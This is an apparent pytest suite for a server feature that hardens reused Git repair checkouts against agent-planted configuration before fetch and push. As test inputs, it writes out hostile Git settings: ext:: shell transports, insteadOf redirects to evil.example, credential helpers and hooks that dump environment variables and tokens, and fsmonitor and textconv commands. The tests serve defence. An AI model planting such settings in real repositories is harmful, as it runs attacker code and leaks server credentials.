"""Git never runs in the agent-writable repair checkout until it is re-proven.

Every server Git command there runs with the server's environment and network
access. A reused checkout is therefore proven server-owned and free of
planted transport, credential, hook and execution configuration before the
target-branch fetch, and again right before the token-bearing push.
"""
import subprocess
from pathlib import Path

import pytest
from fastapi import HTTPException

from app import contribution_review_repairs as repairs

TARGET = {"repo": "owner/base", "base_ref": "main"}


def git(repo: Path, *args: str) -> str:
  return subprocess.run(["git", "-C", str(repo), *args], check=True, text=True,
                        capture_output=True).stdout.strip()


@pytest.fixture
def owned(tmp_path, monkeypatch):
  root = tmp_path / "review-repairs"
  root.mkdir()
  checkout = root / "repair-reused"
  checkout.mkdir()
  git(checkout, "init", "-q")
  monkeypatch.setattr(repairs, "_checkout_root", lambda: root)
  monkeypatch.setattr(repairs, "_read", lambda *a: {"object": {"sha": "a" * 40}})
  return tmp_path, checkout


def network_git_never_runs(monkeypatch):
  real = repairs._git
  def guarded(path, *args, **kwargs):
    if args[:1] and args[0] in {"fetch", "push", "ls-remote", "clone"}:
      pytest.fail(f"network Git ran in an unproven checkout: {args[:1]}")
    return real(path, *args, **kwargs)
  monkeypatch.setattr(repairs, "_git", guarded)


@pytest.mark.parametrize(("key", "value"), [
  ("protocol.ext.allow", "always"),
  ("url.ext::sh -c touch% /tmp/x% ;% false.insteadOf", "https://github.com/owner/base.git"),
  ("url.file:///tmp/evil/.insteadOf", "https://github.com/owner/base.git"),
  ("credential.helper", "!sh -c 'env > /tmp/leak'"),
  ("core.fsmonitor", "touch /tmp/x"),
  ("include.path", "/tmp/elsewhere"),
])
def test_reused_checkout_fetch_refuses_planted_git_configuration(owned, monkeypatch, key, value):
  tmp_path, checkout = owned
  git(checkout, "config", "--local", key, value)
  network_git_never_runs(monkeypatch)
  with pytest.raises(HTTPException, match="unapproved Git configuration"):
    repairs.fetch_target_base(None, tmp_path, checkout, TARGET)


def test_planted_transport_never_executes_with_the_server_environment(owned, monkeypatch):
  tmp_path, checkout = owned
  marker = tmp_path / "ran-with-server-env"
  git(checkout, "config", "--local", "protocol.ext.allow", "always")
  git(checkout, "config", "--local", f"url.ext::sh -c env% >{marker}% ;% false.insteadOf",
      "https://github.com/owner/base.git")
  monkeypatch.setenv("GH_TOKEN_PROBE", "server-secret")
  with pytest.raises(HTTPException):
    repairs.fetch_target_base(None, tmp_path, checkout, TARGET)
  assert not marker.exists()


def test_reused_checkout_fetch_refuses_a_planted_hook(owned, monkeypatch):
  tmp_path, checkout = owned
  hook = checkout / ".git" / "hooks" / "reference-transaction"
  hook.write_text("#!/bin/sh\ntouch /tmp/x\n")
  hook.chmod(0o755)
  network_git_never_runs(monkeypatch)
  with pytest.raises(HTTPException, match="unapproved Git hooks"):
    repairs.fetch_target_base(None, tmp_path, checkout, TARGET)


@pytest.mark.parametrize("where", ["outside", "symlink", "misnamed"])
def test_fetch_refuses_a_checkout_the_server_does_not_own(owned, monkeypatch, where):
  tmp_path, checkout = owned
  if where == "outside":
    path = tmp_path / "repair-outside"
    path.mkdir()
    git(path, "init", "-q")
  elif where == "symlink":
    path = checkout.parent / "repair-link"
    path.symlink_to(checkout)
  else:
    path = checkout.parent / "agent-made"
    path.mkdir()
    git(path, "init", "-q")
  network_git_never_runs(monkeypatch)
  with pytest.raises(HTTPException, match="not server-owned"):
    repairs.fetch_target_base(None, tmp_path, path, TARGET)


def test_push_re_proves_the_checkout_after_remote_preflight(owned, monkeypatch):
  """The agent can write the checkout between validation and the push."""
  tmp_path, checkout = owned
  head = "b" * 40
  validation = {"checkout": str(checkout), "initial_head_sha": "a" * 40, "head_repo": "owner/fork",
                "head_repo_id": 2, "head_ref": "topic", "allowed_files": ["owned.py"],
                "head_sha": head, "diff_sha256": "c" * 64, "base_sha": "a" * 40}
  target = {**TARGET, "head_sha": "a" * 40}
  monkeypatch.setattr(repairs, "validate_repair", lambda *a, **k: validation)
  network_git_never_runs(monkeypatch)
  monkeypatch.setattr(repairs, "_branch_head", lambda *a: target["head_sha"])
  monkeypatch.setattr(repairs, "_target_base_head", lambda *a: "a" * 40)
  def plant():
    git(checkout, "config", "--local", "url.https://evil.example/.insteadOf", "https://github.com/")
  result = repairs.push_repair(None, tmp_path, None, target, validation, before_push=plant)
  assert result.state == "not_dispatched"


# -- execution drivers, askpass and attributes (loop7) ---------------------------------

@pytest.mark.parametrize(("key", "value"), [
  ("diff.evil.textconv", "touch /tmp/x"),
  ("diff.Evil.command", "touch /tmp/x"),
  ("diff.external", "touch /tmp/x"),
  ("merge.evil.driver", "touch /tmp/x"),
  ("core.askPass", "/tmp/x"),
  ("core.attributesFile", "/tmp/attributes"),
  ("core.editor", "touch /tmp/x"),
  ("sequence.editor", "touch /tmp/x"),
  ("gpg.program", "/tmp/x"),
  ("gpg.ssh.program", "/tmp/x"),
  ("pager.log", "touch /tmp/x"),
])
def test_execution_drivers_and_programs_are_rejected(owned, monkeypatch, key, value):
  tmp_path, checkout = owned
  git(checkout, "config", "--local", key, value)
  network_git_never_runs(monkeypatch)
  with pytest.raises(HTTPException, match="unapproved Git configuration"):
    repairs.owned_checkout(checkout)


@pytest.mark.parametrize(("key", "value"), [
  ("diff.renames", "true"), ("diff.evil.binary", "true"),
  ("merge.conflictStyle", "diff3"), ("core.autocrlf", "false"),
])
def test_inert_but_unneeded_settings_are_not_in_the_small_allowlist(owned, key, value):
  _tmp_path, checkout = owned
  git(checkout, "config", "--local", key, value)
  with pytest.raises(HTTPException, match="unapproved Git configuration"):
    repairs.owned_checkout(checkout)


def test_checkout_author_identity_is_allowed(owned):
  _tmp_path, checkout = owned
  git(checkout, "config", "--local", "user.name", "Agent")
  assert repairs.owned_checkout(checkout) == checkout


def test_textconv_never_runs_in_the_canonical_diff_of_a_rejected_checkout(owned):
  from app import app_git
  tmp_path, checkout = owned
  git(checkout, "config", "user.name", "x"); git(checkout, "config", "user.email", "x@x")
  (checkout / "a.txt").write_text("one\n"); git(checkout, "add", "a.txt"); git(checkout, "commit", "-qm", "1")
  initial = git(checkout, "rev-parse", "HEAD")
  (checkout / "a.txt").write_text("two\n"); git(checkout, "add", "a.txt"); git(checkout, "commit", "-qm", "2")
  head = git(checkout, "rev-parse", "HEAD")
  marker = tmp_path / "textconv-ran"
  git(checkout, "config", "--local", "diff.evil.textconv", f"sh -c 'touch {marker}; cat \"$0\"'")
  (checkout / ".git" / "info").mkdir(exist_ok=True)
  (checkout / ".git" / "info" / "attributes").write_text("* diff=evil\n")
  with pytest.raises(HTTPException):
    repairs.owned_checkout(checkout)
  assert app_git._canonical_diff(checkout, initial, head, read_only=True)
  assert not marker.exists()


def test_repository_wide_attributes_are_rejected_on_their_own(owned):
  _tmp_path, checkout = owned
  (checkout / ".git" / "info").mkdir(exist_ok=True)
  (checkout / ".git" / "info" / "attributes").write_text("* diff=anything\n")
  with pytest.raises(HTTPException, match="ancestry metadata"):
    repairs.owned_checkout(checkout)


def test_configuration_git_cannot_read_is_rejected_not_clean(owned):
  """A malformed include made the name check exit 128 with no output."""
  _tmp_path, checkout = owned
  git(checkout, "config", "--local", "include.path", "/bin/true")
  with pytest.raises(HTTPException):
    repairs.owned_checkout(checkout)
  (checkout / ".git" / "config").write_text("[core\n  broken")
  with pytest.raises(HTTPException, match="could not be verified"):
    repairs.owned_checkout(checkout)


def test_repair_git_never_runs_an_askpass_program(tmp_path, monkeypatch):
  observed = {}
  def run(_argv, *, env, **_kwargs):
    observed.update(env)
    return type("Result", (), {"returncode": 0, "stdout": ""})()
  monkeypatch.setattr(repairs, "_run_cmd", run)
  repairs._git(tmp_path, "status", "--porcelain")
  assert observed["GIT_ASKPASS"] == "/bin/false"
  assert observed["SSH_ASKPASS"] == "/bin/false"
  assert observed["GIT_CONFIG_GLOBAL"] == "/dev/null"


def test_references_git_cannot_read_are_rejected_not_clean(owned):
  _tmp_path, checkout = owned
  (checkout / ".git" / "packed-refs").write_text("garbage line\n")
  with pytest.raises(HTTPException, match="references could not be verified"):
    repairs.owned_checkout(checkout)


# -- nested repositories and credentials ---------------------------------------------

def plant_submodule(checkout: Path, marker: Path, *, stage: bool = True) -> None:
  """An agent-made nested repository whose own config starts a program."""
  sub = checkout / "sub"
  sub.mkdir()
  git(sub, "init", "-q")
  git(sub, "-c", "user.name=x", "-c", "user.email=x@x", "commit", "-q", "--allow-empty", "-m", "s")
  git(sub, "config", "--local", "core.fsmonitor", f"env > {marker}; false")
  if stage:
    git(checkout, "add", "sub")


def test_a_staged_submodule_cannot_start_its_fsmonitor_or_pass_the_guard(owned, monkeypatch):
  tmp_path, checkout = owned
  marker = tmp_path / "fsmonitor-ran"
  plant_submodule(checkout, marker)
  network_git_never_runs(monkeypatch)
  # The exact local read validate_repair runs first, even if a guard missed it.
  repairs._git(checkout, "status", "--porcelain", "--untracked-files=all")
  assert not marker.exists()
  with pytest.raises(HTTPException, match="contains a submodule"):
    repairs.owned_checkout(checkout)
  assert not marker.exists()


def test_github_credentials_reach_only_network_git(tmp_path, monkeypatch):
  observed = {}
  def run(argv, *, env, **_kwargs):
    observed[argv[argv.index("-C") + 2]] = env
    return type("Result", (), {"returncode": 0, "stdout": ""})()
  monkeypatch.setattr(repairs, "_run_cmd", run)
  monkeypatch.setattr(repairs, "_git_env", lambda _repo: {
    "PATH": "/usr/bin", "GH_TOKEN": "server-secret", "GH_CONFIG_DIR": "/auth"})
  for command in ("status", "diff-tree", "fetch", "push"):
    repairs._git(tmp_path, command)
  for local in ("status", "diff-tree"):
    assert "GH_TOKEN" not in observed[local] and "GH_CONFIG_DIR" not in observed[local]
    assert observed[local]["GIT_CONFIG_KEY_0"] == "core.fsmonitor"
  for network in ("fetch", "push"):
    assert observed[network]["GH_TOKEN"] == "server-secret"
    assert observed[network]["GH_CONFIG_DIR"] == "/auth"
  assert "GH_TOKEN" not in repairs._repair_git_env(tmp_path)


def token_bearing_git(tmp_path, monkeypatch):
  """Server Git env with a probe token, never the instance's real credentials."""
  auth = tmp_path / "gh-auth"
  auth.mkdir()
  monkeypatch.setattr(repairs, "_git_env", lambda _repo: {
    "PATH": "/usr/bin:/bin", "HOME": str(tmp_path), "GH_TOKEN": "probe-token",
    "GH_CONFIG_DIR": str(auth)})


def test_push_never_runs_a_hook_planted_after_the_checkout_proof(owned, monkeypatch):
  tmp_path, checkout = owned
  token_bearing_git(tmp_path, monkeypatch)
  git(checkout, "-c", "user.name=x", "-c", "user.email=x@x", "commit", "-q", "--allow-empty", "-m", "c")
  remote = tmp_path / "remote.git"
  subprocess.run(["git", "init", "-q", "--bare", str(remote)], check=True)
  marker = tmp_path / "pre-push-ran"
  hook = checkout / ".git" / "hooks" / "pre-push"
  hook.write_text(f"#!/bin/sh\nenv > {marker}\n")
  hook.chmod(0o755)
  result = repairs._git(checkout, "push", "--porcelain", str(remote), "HEAD:refs/heads/topic", check=False)
  assert result.returncode == 0
  assert not marker.exists()


def test_network_git_never_consults_a_checkout_credential_helper(owned, monkeypatch):
  tmp_path, checkout = owned
  token_bearing_git(tmp_path, monkeypatch)
  marker = tmp_path / "local-helper-ran"
  git(checkout, "config", "--local", "credential.helper", f"!f() {{ env > {marker}; }}; f")
  observed = {}
  def capture(argv, *, env, **_kwargs):
    observed.update(argv=argv, env=env)
    return type("Result", (), {"returncode": 0, "stdout": ""})()
  monkeypatch.setattr(repairs, "_run_cmd", capture)
  for command in ("fetch", "push"):
    repairs._git(checkout, command)
    # Ask Git which helpers it consults under exactly this argv prefix and env.
    prefix = observed["argv"][:observed["argv"].index("-C") + 2]
    subprocess.run([*prefix, "credential", "fill"], input="protocol=https\nhost=github.com\n\n",
                   env=observed["env"], text=True, capture_output=True, timeout=30)
    assert not marker.exists(), command
  assert "credential.helper=" in prefix
  assert prefix.index("credential.helper=") < prefix.index("credential.helper=!gh auth git-credential")
